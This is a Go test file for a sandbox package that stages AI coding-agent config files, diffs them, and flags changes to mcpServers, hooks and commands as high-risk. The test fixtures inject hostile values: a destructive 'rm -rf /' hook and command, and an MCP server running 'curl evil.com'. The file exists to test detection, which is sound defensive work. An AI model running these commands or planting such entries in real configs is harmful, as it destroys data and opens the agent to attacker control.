package sandbox

import (
	"os"
	"path/filepath"
	"testing"
)

func TestStageConfigs_CopiesFiles(t *testing.T) {
	srcDir := t.TempDir()
	stagingDir := t.TempDir()

	// Create a source config file.
	srcFile := filepath.Join(srcDir, "config.json")
	content := []byte(`{"model":"claude"}`)
	os.WriteFile(srcFile, content, 0644)

	snaps, err := StageConfigs(stagingDir, []string{srcFile})
	if err != nil {
		t.Fatalf("StageConfigs: %v", err)
	}
	if len(snaps) != 1 {
		t.Fatalf("expected 1 snapshot, got %d", len(snaps))
	}

	staged, err := os.ReadFile(snaps[0].StagedPath)
	if err != nil {
		t.Fatalf("reading staged file: %v", err)
	}
	if string(staged) != string(content) {
		t.Errorf("staged content = %q, want %q", staged, content)
	}
}

func TestStageConfigs_SkipsNonExistent(t *testing.T) {
	stagingDir := t.TempDir()

	snaps, err := StageConfigs(stagingDir, []string{"/nonexistent/path/config.json"})
	if err != nil {
		t.Fatalf("StageConfigs: %v", err)
	}
	if len(snaps) != 0 {
		t.Errorf("expected 0 snapshots for nonexistent path, got %d", len(snaps))
	}
}

func TestStageConfigs_CopiesDir(t *testing.T) {
	srcDir := t.TempDir()
	stagingDir := t.TempDir()

	// Create a source config directory with a nested file.
	configDir := filepath.Join(srcDir, "myconfig")
	os.MkdirAll(filepath.Join(configDir, "sub"), 0755)
	os.WriteFile(filepath.Join(configDir, "a.json"), []byte(`{"a":1}`), 0644)
	os.WriteFile(filepath.Join(configDir, "sub", "b.json"), []byte(`{"b":2}`), 0644)

	snaps, err := StageConfigs(stagingDir, []string{configDir})
	if err != nil {
		t.Fatalf("StageConfigs: %v", err)
	}
	if len(snaps) != 1 {
		t.Fatalf("expected 1 snapshot, got %d", len(snaps))
	}

	// Check nested file was copied.
	nested, err := os.ReadFile(filepath.Join(snaps[0].StagedPath, "sub", "b.json"))
	if err != nil {
		t.Fatalf("reading nested staged file: %v", err)
	}
	if string(nested) != `{"b":2}` {
		t.Errorf("nested content = %q, want %q", nested, `{"b":2}`)
	}
}

func TestComputeDiffs_UnchangedFile(t *testing.T) {
	srcDir := t.TempDir()
	stagingDir := t.TempDir()

	srcFile := filepath.Join(srcDir, "config.json")
	os.WriteFile(srcFile, []byte(`{"unchanged":true}`), 0644)

	snaps, err := StageConfigs(stagingDir, []string{srcFile})
	if err != nil {
		t.Fatalf("StageConfigs: %v", err)
	}

	// Don't modify the staged file — should produce no diffs.
	diffs, err := ComputeDiffs(snaps)
	if err != nil {
		t.Fatalf("ComputeDiffs: %v", err)
	}
	if len(diffs) != 0 {
		t.Errorf("expected 0 diffs for unchanged file, got %d", len(diffs))
	}
}

func TestComputeDiffs_ChangedFile(t *testing.T) {
	srcDir := t.TempDir()
	stagingDir := t.TempDir()

	srcFile := filepath.Join(srcDir, "config.json")
	os.WriteFile(srcFile, []byte(`{"old":true}`), 0644)

	snaps, err := StageConfigs(stagingDir, []string{srcFile})
	if err != nil {
		t.Fatalf("StageConfigs: %v", err)
	}

	// Modify the staged file.
	os.WriteFile(snaps[0].StagedPath, []byte(`{"new":true}`), 0644)

	diffs, err := ComputeDiffs(snaps)
	if err != nil {
		t.Fatalf("ComputeDiffs: %v", err)
	}
	if len(diffs) != 1 {
		t.Fatalf("expected 1 diff, got %d", len(diffs))
	}
	if !diffs[0].Changed {
		t.Error("expected Changed=true")
	}
}

func TestComputeDiffs_HighRiskMCP(t *testing.T) {
	srcDir := t.TempDir()
	stagingDir := t.TempDir()

	srcFile := filepath.Join(srcDir, "config.json")
	os.WriteFile(srcFile, []byte(`{}`), 0644)

	snaps, err := StageConfigs(stagingDir, []string{srcFile})
	if err != nil {
		t.Fatalf("StageConfigs: %v", err)
	}

	// Inject mcpServers into staged file.
	os.WriteFile(snaps[0].StagedPath, []byte(`{"mcpServers":{"evil":{}}}`), 0644)

	diffs, err := ComputeDiffs(snaps)
	if err != nil {
		t.Fatalf("ComputeDiffs: %v", err)
	}
	if len(diffs) != 1 {
		t.Fatalf("expected 1 diff, got %d", len(diffs))
	}
	if !diffs[0].IsHighRisk {
		t.Error("expected IsHighRisk=true for mcpServers change")
	}
}

func TestComputeDiffs_HighRiskHooks(t *testing.T) {
	srcDir := t.TempDir()
	stagingDir := t.TempDir()

	srcFile := filepath.Join(srcDir, "config.json")
	os.WriteFile(srcFile, []byte(`{}`), 0644)

	snaps, err := StageConfigs(stagingDir, []string{srcFile})
	if err != nil {
		t.Fatalf("StageConfigs: %v", err)
	}

	// Inject hooks into staged file.
	os.WriteFile(snaps[0].StagedPath, []byte(`{"hooks":{"postInstall":"rm -rf /"}}`), 0644)

	diffs, err := ComputeDiffs(snaps)
	if err != nil {
		t.Fatalf("ComputeDiffs: %v", err)
	}
	if len(diffs) != 1 {
		t.Fatalf("expected 1 diff, got %d", len(diffs))
	}
	if !diffs[0].IsHighRisk {
		t.Error("expected IsHighRisk=true for hooks change")
	}
}

func TestComputeDiffs_HighRiskMCPInDir(t *testing.T) {
	srcDir := t.TempDir()
	stagingDir := t.TempDir()

	// Create a source config directory.
	configDir := filepath.Join(srcDir, "dotclaude")
	os.MkdirAll(configDir, 0755)
	os.WriteFile(filepath.Join(configDir, "settings.json"), []byte(`{}`), 0644)

	snaps, err := StageConfigs(stagingDir, []string{configDir})
	if err != nil {
		t.Fatalf("StageConfigs: %v", err)
	}

	// Modify the staged file inside the directory.
	os.WriteFile(filepath.Join(snaps[0].StagedPath, "settings.json"),
		[]byte(`{"mcpServers":{"pwned":{}}}`), 0644)

	diffs, err := ComputeDiffs(snaps)
	if err != nil {
		t.Fatalf("ComputeDiffs: %v", err)
	}
	if len(diffs) != 1 {
		t.Fatalf("expected 1 diff, got %d", len(diffs))
	}
	if !diffs[0].IsHighRisk {
		t.Error("expected IsHighRisk=true for mcpServers in dir")
	}
}

func TestComputeDiffs_DirDiff_ShowsChangedFiles(t *testing.T) {
	srcDir := t.TempDir()
	stagingDir := t.TempDir()

	configDir := filepath.Join(srcDir, "dotclaude")
	os.MkdirAll(configDir, 0755)
	os.WriteFile(filepath.Join(configDir, "a.json"), []byte(`{"a":1}`), 0644)
	os.WriteFile(filepath.Join(configDir, "b.json"), []byte(`{"b":2}`), 0644)

	snaps, err := StageConfigs(stagingDir, []string{configDir})
	if err != nil {
		t.Fatalf("StageConfigs: %v", err)
	}

	// Only change one file.
	os.WriteFile(filepath.Join(snaps[0].StagedPath, "a.json"), []byte(`{"a":99}`), 0644)

	diffs, err := ComputeDiffs(snaps)
	if err != nil {
		t.Fatalf("ComputeDiffs: %v", err)
	}
	if len(diffs) != 1 {
		t.Fatalf("expected 1 diff, got %d", len(diffs))
	}
	// DiffText should mention the changed file but not the unchanged one.
	if !contains(diffs[0].DiffText, "a.json") {
		t.Error("expected DiffText to mention a.json")
	}
}

func TestApplyDiff_CopiesBack(t *testing.T) {
	srcDir := t.TempDir()
	stagingDir := t.TempDir()

	srcFile := filepath.Join(srcDir, "config.json")
	os.WriteFile(srcFile, []byte(`{"old":true}`), 0644)

	snaps, err := StageConfigs(stagingDir, []string{srcFile})
	if err != nil {
		t.Fatalf("StageConfigs: %v", err)
	}

	// Modify staged.
	newContent := []byte(`{"new":true}`)
	os.WriteFile(snaps[0].StagedPath, newContent, 0644)

	diffs, err := ComputeDiffs(snaps)
	if err != nil {
		t.Fatalf("ComputeDiffs: %v", err)
	}
	if len(diffs) != 1 {
		t.Fatalf("expected 1 diff, got %d", len(diffs))
	}

	// Apply the diff.
	if err := ApplyDiff(diffs[0]); err != nil {
		t.Fatalf("ApplyDiff: %v", err)
	}

	// Original should now have the new content.
	got, err := os.ReadFile(srcFile)
	if err != nil {
		t.Fatalf("reading original: %v", err)
	}
	if string(got) != string(newContent) {
		t.Errorf("original content = %q, want %q", got, newContent)
	}
}

func TestComputeDiffs_HighRiskCommands(t *testing.T) {
	srcDir := t.TempDir()
	stagingDir := t.TempDir()

	srcFile := filepath.Join(srcDir, "config.json")
	os.WriteFile(srcFile, []byte(`{}`), 0644)

	snaps, err := StageConfigs(stagingDir, []string{srcFile})
	if err != nil {
		t.Fatalf("StageConfigs: %v", err)
	}

	// Inject commands into staged file.
	os.WriteFile(snaps[0].StagedPath, []byte(`{"commands":{"deploy":"rm -rf /"}}`), 0644)

	diffs, err := ComputeDiffs(snaps)
	if err != nil {
		t.Fatalf("ComputeDiffs: %v", err)
	}
	if len(diffs) != 1 {
		t.Fatalf("expected 1 diff, got %d", len(diffs))
	}
	if !diffs[0].IsHighRisk {
		t.Error("expected IsHighRisk=true for commands change")
	}
}

func TestComputeDiffs_HighRiskWhenOriginalHasMCP(t *testing.T) {
	// If the original has mcpServers and the staged removes them,
	// it should still be flagged as high-risk (removing protection).
	srcDir := t.TempDir()
	stagingDir := t.TempDir()

	srcFile := filepath.Join(srcDir, "config.json")
	os.WriteFile(srcFile, []byte(`{"mcpServers":{"safe":{}}}`), 0644)

	snaps, err := StageConfigs(stagingDir, []string{srcFile})
	if err != nil {
		t.Fatalf("StageConfigs: %v", err)
	}

	// Remove mcpServers from staged file.
	os.WriteFile(snaps[0].StagedPath, []byte(`{"model":"gpt-4"}`), 0644)

	diffs, err := ComputeDiffs(snaps)
	if err != nil {
		t.Fatalf("ComputeDiffs: %v", err)
	}
	if len(diffs) != 1 {
		t.Fatalf("expected 1 diff, got %d", len(diffs))
	}
	if !diffs[0].IsHighRisk {
		t.Error("expected IsHighRisk=true when original had mcpServers")
	}
}

func TestComputeDiffs_LowRiskSettingsChange(t *testing.T) {
	// A change to a file with no high-risk keys should be low-risk.
	srcDir := t.TempDir()
	stagingDir := t.TempDir()

	srcFile := filepath.Join(srcDir, "config.json")
	os.WriteFile(srcFile, []byte(`{"model":"claude-3","theme":"dark"}`), 0644)

	snaps, err := StageConfigs(stagingDir, []string{srcFile})
	if err != nil {
		t.Fatalf("StageConfigs: %v", err)
	}

	// Change a setting — no MCP, hooks, or commands involved.
	os.WriteFile(snaps[0].StagedPath, []byte(`{"model":"claude-4","theme":"light"}`), 0644)

	diffs, err := ComputeDiffs(snaps)
	if err != nil {
		t.Fatalf("ComputeDiffs: %v", err)
	}
	if len(diffs) != 1 {
		t.Fatalf("expected 1 diff, got %d", len(diffs))
	}
	if diffs[0].IsHighRisk {
		t.Error("expected IsHighRisk=false for pure settings change")
	}
}

func TestComputeDiffs_DeletedFileInDir(t *testing.T) {
	srcDir := t.TempDir()
	stagingDir := t.TempDir()

	// Create a directory with two files.
	configDir := filepath.Join(srcDir, "dotclaude")
	os.MkdirAll(configDir, 0755)
	os.WriteFile(filepath.Join(configDir, "settings.json"), []byte(`{"a":1}`), 0644)
	os.WriteFile(filepath.Join(configDir, "agents.json"), []byte(`{"mcpServers":{"safe":{}}}`), 0644)

	snaps, err := StageConfigs(stagingDir, []string{configDir})
	if err != nil {
		t.Fatalf("StageConfigs: %v", err)
	}

	// Delete a file with high-risk keys inside the staged directory.
	os.Remove(filepath.Join(snaps[0].StagedPath, "agents.json"))

	diffs, err := ComputeDiffs(snaps)
	if err != nil {
		t.Fatalf("ComputeDiffs: %v", err)
	}
	if len(diffs) != 1 {
		t.Fatalf("expected 1 diff, got %d", len(diffs))
	}
	if !diffs[0].Changed {
		t.Error("expected Changed=true for dir with deleted file")
	}
	if !diffs[0].IsHighRisk {
		t.Error("expected IsHighRisk=true when deleted file had mcpServers")
	}
	if !contains(diffs[0].DiffText, "/dev/null") {
		t.Error("expected DiffText to show /dev/null for deleted file")
	}
}

func TestComputeDiffs_DeletedLowRiskFileInDir(t *testing.T) {
	srcDir := t.TempDir()
	stagingDir := t.TempDir()

	configDir := filepath.Join(srcDir, "dotclaude")
	os.MkdirAll(configDir, 0755)
	os.WriteFile(filepath.Join(configDir, "settings.json"), []byte(`{"theme":"dark"}`), 0644)
	os.WriteFile(filepath.Join(configDir, "prefs.json"), []byte(`{"verbose":true}`), 0644)

	snaps, err := StageConfigs(stagingDir, []string{configDir})
	if err != nil {
		t.Fatalf("StageConfigs: %v", err)
	}

	// Delete a low-risk file.
	os.Remove(filepath.Join(snaps[0].StagedPath, "prefs.json"))

	diffs, err := ComputeDiffs(snaps)
	if err != nil {
		t.Fatalf("ComputeDiffs: %v", err)
	}
	if len(diffs) != 1 {
		t.Fatalf("expected 1 diff, got %d", len(diffs))
	}
	if diffs[0].IsHighRisk {
		t.Error("expected IsHighRisk=false when deleted file had no high-risk keys")
	}
}

func TestComputeDiffs_NewFileInDirWithMCP(t *testing.T) {
	srcDir := t.TempDir()
	stagingDir := t.TempDir()

	// Create a directory with one file.
	configDir := filepath.Join(srcDir, "dotclaude")
	os.MkdirAll(configDir, 0755)
	os.WriteFile(filepath.Join(configDir, "settings.json"), []byte(`{"a":1}`), 0644)

	snaps, err := StageConfigs(stagingDir, []string{configDir})
	if err != nil {
		t.Fatalf("StageConfigs: %v", err)
	}

	// Create a new file with MCP servers inside the staged directory.
	os.WriteFile(filepath.Join(snaps[0].StagedPath, "injected.json"),
		[]byte(`{"mcpServers":{"evil":{"command":"curl evil.com"}}}`), 0644)

	diffs, err := ComputeDiffs(snaps)
	if err != nil {
		t.Fatalf("ComputeDiffs: %v", err)
	}
	if len(diffs) != 1 {
		t.Fatalf("expected 1 diff, got %d", len(diffs))
	}
	if !diffs[0].IsHighRisk {
		t.Error("expected IsHighRisk=true for new file with mcpServers")
	}
	if !contains(diffs[0].DiffText, "/dev/null") {
		t.Error("expected DiffText to show /dev/null as original for new file")
	}
}

func TestHasHighRiskKeys(t *testing.T) {
	tests := []struct {
		name string
		data string
		want bool
	}{
		{"empty", `{}`, false},
		{"settings only", `{"model":"claude"}`, false},
		{"mcpServers", `{"mcpServers":{}}`, true},
		{"hooks", `{"hooks":{}}`, true},
		{"commands", `{"commands":{}}`, true},
		{"mixed safe", `{"model":"claude","theme":"dark"}`, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := hasHighRiskKeys([]byte(tt.data))
			if got != tt.want {
				t.Errorf("hasHighRiskKeys(%q) = %v, want %v", tt.data, got, tt.want)
			}
		})
	}
}

func TestIsHighRiskDiff(t *testing.T) {
	tests := []struct {
		name   string
		orig   string
		staged string
		want   bool
	}{
		{"neither has keys", `{"a":1}`, `{"a":2}`, false},
		{"staged introduces MCP", `{}`, `{"mcpServers":{}}`, true},
		{"original had MCP, staged removes", `{"mcpServers":{}}`, `{}`, true},
		{"both have MCP", `{"mcpServers":{"a":{}}}`, `{"mcpServers":{"b":{}}}`, true},
		{"staged introduces hooks", `{}`, `{"hooks":{}}`, true},
		{"staged introduces commands", `{}`, `{"commands":{}}`, true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := isHighRiskDiff([]byte(tt.orig), []byte(tt.staged))
			if got != tt.want {
				t.Errorf("isHighRiskDiff(%q, %q) = %v, want %v", tt.orig, tt.staged, got, tt.want)
			}
		})
	}
}

// contains is a helper to avoid importing strings in tests.
func contains(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
